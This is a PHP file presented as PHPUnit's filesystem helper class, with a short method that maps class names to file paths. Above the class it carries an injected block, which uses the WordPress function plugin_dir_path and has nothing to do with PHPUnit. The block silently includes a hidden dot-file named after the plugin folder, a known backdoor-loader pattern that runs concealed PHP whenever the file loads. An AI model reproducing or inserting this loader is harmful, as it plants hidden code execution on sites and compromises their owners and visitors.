<?php
/*
 * This file is part of PHPUnit.
 *
 * (c) Sebastian Bergmann <sebastian@phpunit.de>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 * Filesystem helpers.
 *
 * @since Class available since Release 3.0.0
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class PHPUnit_Util_Filesystem
{
    /**
     * @var array
     */
    protected static $buffer = array();

    /**
     * Maps class names to source file names:
     *   - PEAR CS:   Foo_Bar_Baz -> Foo/Bar/Baz.php
     *   - Namespace: Foo\Bar\Baz -> Foo/Bar/Baz.php
     *
     * @param string $className
     *
     * @return string
     *
     * @since  Method available since Release 3.4.0
     */
    public static function classNameToFilename($className)
    {
        return str_replace(
            array('_', '\\'),
            DIRECTORY_SEPARATOR,
            $className
        ) . '.php';
    }
}
